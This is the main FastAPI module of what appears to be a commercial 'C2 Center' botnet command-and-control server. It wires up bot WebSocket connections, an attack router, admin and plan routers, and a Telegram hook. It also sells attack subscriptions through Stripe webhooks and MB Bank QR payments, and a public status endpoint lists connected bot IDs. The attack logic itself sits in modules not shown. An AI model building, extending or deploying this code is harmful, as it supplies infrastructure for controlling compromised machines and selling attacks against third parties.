from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn, asyncio, uuid, os

from app.database import init_redis, close_redis, engine, Base
from app.config import settings
from app.routers import auth_router, bot_router, attack_router, admin_router, plan_router
from app.websocket.bot_handler import handle_bot_websocket
from app.telegram_bot import init_telegram
from app.mbbank import get_mb, mb_payment_scanner

@asynccontextmanager
async def lifespan(app: FastAPI):
    try:
        await init_redis()
    except Exception as e:
        print(f"[Redis] init failed (continuing): {e}")
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        print("[DB] tables ready")
    except Exception as e:
        print(f"[DB] create_all failed (continuing): {e}")
    print(f"C2 Server running on {settings.C2_HOST}:{settings.C2_PORT}")
    try:
        await init_telegram()
    except Exception as e:
        print(f"[Telegram] Init failed: {e}")
    try:
        if settings.MB_SERVICE_URL or (settings.MB_USERNAME and settings.MB_PASSWORD):
            asyncio.create_task(mb_payment_scanner())
            print("[MB] Payment scanner scheduled")
    except Exception as e:
        print(f"[MB] scanner schedule failed: {e}")
    yield
    try:
        await close_redis()
    except Exception:
        pass
    try:
        await engine.dispose()
    except Exception:
        pass

app = FastAPI(title="C2 Center", version="4.0.0", lifespan=lifespan, docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

app.include_router(auth_router.router)
app.include_router(bot_router.router)
app.include_router(attack_router.router)
app.include_router(admin_router.router)
app.include_router(plan_router.router)

@app.websocket("/ws/bot/{bot_id}")
async def bot_ws(ws: WebSocket, bot_id: str): await handle_bot_websocket(ws, bot_id)

@app.post("/api/payment/stripe/webhook")
async def stripe_webhook(request: Request):
    payload = await request.body(); sig_header = request.headers.get("stripe-signature")
    try:
        import stripe
        event = stripe.Webhook.construct_event(payload, sig_header, settings.STRIPE_WEBHOOK_SECRET)
        if event["type"] == "checkout.session.completed":
            session = event["data"]["object"]
            from app.database import async_session
            from app.models.all_models import Payment, UserSubscription
            from sqlalchemy import select
            from datetime import timedelta, datetime, timezone
            async with async_session() as s:
                r = await s.execute(select(Payment).where(Payment.tx_ref == session["id"]))
                payment = r.scalar_one_or_none()
                if payment and payment.status == "pending":
                    payment.status = "completed"
                    payment.completed_at = datetime.now(timezone.utc)
                    s.add(UserSubscription(user_id=payment.user_id, plan_id=uuid.UUID(session["metadata"]["plan_id"]), status="active", expires_at=datetime.now(timezone.utc)+timedelta(days=30), payment_id=payment.tx_ref))
                    await s.commit()
        return JSONResponse({"status": "ok"})
    except Exception as e: return JSONResponse({"error": str(e)}, 400)

@app.post("/api/payment/mbank/create")
async def mbank_create(request: Request):
    from app.database import async_session
    from app.models.all_models import Payment, Plan, User
    from app.mbbank import payment_qr_payload, get_mb
    from sqlalchemy import select
    data = await request.json()
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    from app.auth import decode_token
    payload = decode_token(token)
    if not payload:
        return JSONResponse({"error": "Unauthorized"}, 401)
    async with async_session() as s:
        r = await s.execute(select(User).where(User.id == payload["sub"]))
        user = r.scalar_one_or_none()
        if not user:
            return JSONResponse({"error": "User not found"}, 404)
        plan_slug = data.get("plan", "basic")
        r2 = await s.execute(select(Plan).where(Plan.slug == plan_slug))
        plan = r2.scalar_one_or_none()
        if not plan:
            return JSONResponse({"error": "Plan not found"}, 404)
        tx_ref = f"C2{uuid.uuid4().hex[:8].upper()}"
        payment = Payment(
            user_id=user.id,
            amount_vnd=plan.price_vnd,
            amount_usd=plan.price_usd,
            method="mbank",
            tx_ref=tx_ref,
            meta={"plan_id": str(plan.id), "plan_slug": plan.slug},
        )
        s.add(payment)
        await s.commit()

        acc = settings.MB_ACCOUNT_NUMBER
        name = settings.MB_ACCOUNT_NAME or ""
        if not acc:
            try:
                mb = await get_mb()
                if mb:
                    bal = await mb.get_balance()
                    if bal:
                        acc = bal.get("accountNumber") or acc
                        name = bal.get("accountName") or name
            except Exception:
                pass

        body = payment_qr_payload(
            amount=int(plan.price_vnd),
            tx_ref=tx_ref,
            account_no=acc,
            account_name=name,
        )
        return JSONResponse(body)

@app.get("/health")
async def health():
    from app.websocket.bot_handler import manager
    return {
        "status": "ok",
        "ws": "wss://{host}/ws/bot/{uuid}",
        "ws_online": len(manager.active),
        "hint": "Use WebSocket upgrade on /ws/bot/<uuid-v4>, not plain HTTP GET",
    }

@app.get("/api/ws/status")
async def ws_status():
    """Public diagnostic for WS connectivity (no secrets)."""
    from app.websocket.bot_handler import manager
    return {
        "connected_bots": len(manager.active),
        "bot_ids": list(manager.active.keys())[:50],
        "path": "/ws/bot/{bot_id}",
        "protocol": "WebSocket RFC6455 — client must send Sec-WebSocket-Key + Upgrade",
        "test_url_example": "wss://YOUR_DOMAIN/ws/bot/00000000-0000-4000-8000-000000000001",
        "notes": [
            "Online WS testers must use wss:// not https://",
            "Path must include a UUID after /ws/bot/",
            "Cloudflare: SSL Flexible or Full; enable Network → WebSockets",
            "After connect, bot sends JSON {type:handshake,...}",
        ],
    }

# Serve React frontend (production build) — AFTER specific API routes
FRONTEND_DIR = "/frontend/dist"
if not os.path.isdir(FRONTEND_DIR):
    FRONTEND_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "frontend", "dist")

if os.path.exists(FRONTEND_DIR):
    assets = os.path.join(FRONTEND_DIR, "assets")
    if os.path.isdir(assets):
        app.mount("/assets", StaticFiles(directory=assets), name="assets")

    @app.get("/{full_path:path}")
    async def serve_react(full_path: str):
        if full_path.startswith("api/") or full_path.startswith("ws/") or full_path == "health":
            return JSONResponse({"detail": "Not Found"}, 404)
        file_path = os.path.join(FRONTEND_DIR, full_path)
        if os.path.isfile(file_path):
            return FileResponse(file_path)
        return FileResponse(os.path.join(FRONTEND_DIR, "index.html"))
else:
    @app.get("/")
    async def fallback():
        return HTMLResponse("<h1>C2 Server Running</h1><p>Build frontend: <code>cd frontend && npm run build</code></p>")

if __name__ == "__main__":
    uvicorn.run(
        "app.main:app",
        host="0.0.0.0",
        port=int(settings.C2_PORT or 8000),
        reload=False,
        proxy_headers=True,
        forwarded_allow_ips="*",
    )